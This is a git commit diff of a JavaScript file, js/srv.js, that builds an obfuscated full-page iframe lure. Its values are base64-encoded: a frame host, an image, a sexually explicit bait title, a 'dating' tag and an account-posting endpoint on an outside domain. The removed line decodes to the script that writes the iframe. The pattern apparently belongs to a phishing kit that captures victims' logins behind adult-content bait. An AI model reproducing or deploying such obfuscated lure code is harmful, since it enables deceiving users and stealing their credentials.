ae631c04b282f1d8a808fca54c7bb87d18e7769f
fb01cmx <53531630+fb01cmx@users.noreply.github.com>
2019-09-24 23:51:26 +0700

    Update srv.js

--- js/srv.js
+++ js/srv.js
@@ -1,1 +1,26 @@
-decode("PHNjcmlwdD4KZG9jdW1lbnQud3JpdGUoIjxpZnJhbWUgbmFtZT0nc2l0ZScgaWQ9J3NpdGUnIHdpZHRoPScxMDAlJyBoZWlnaHQ9JzEwMCUnIGZyYW1lYm9yZGVyPScwJyBtYXJnaW5oZWlnaHQ9JzAnIG1hcmdpbndpZHRoPScwJyBzcmM9JyIKCSsgZnJtICsgJz9pPScgKyBpbWcgKyAnJnQ9JyArIHR0bCArICcmcz0nICsgc3J2ICsgJyZ1PScgKyB1c3IgKyAnJmY9JyArIGZwICsgIic");
+var frm = atob('aHR0cHM6Ly9mYjAxY214LmdpdGh1Yi5pby8');
+if(cid("i")){
+	var img = cid("i");
+}else{
+	var img = 'aHR0cHM6Ly9pLmltZ3VyLmNvbS9NSm1jdEttLmpwZw';
+}
+if(cid("t")){
+	var ttl = cid("t");
+}else{
+	var ttl = 'U2Fzc3kgR2luYSBpcyBnZXR0aW5nIGZpbmdlcmZ1Y2tlZCBhbmQgZnVja2VkIGluIHRoZSBtaWRkbGUgb2YgYSBuaWNlIGRheS4';
+}
+if(cid("s")){
+	var srv = cid("s");
+}else{
+	var srv = 'aHR0cHM6Ly93ZWR1c3MuY29tL2FrdW4vcG9zdC5waHA';
+}
+if(cid("u")){
+	var usr = cid("u");
+}else{
+	var usr = 'UHJla2Vy';
+}
+if(cid("f")){
+	var fp = cid("f");
+}else{
+	var fp = 'ZGF0aW5n';
+}
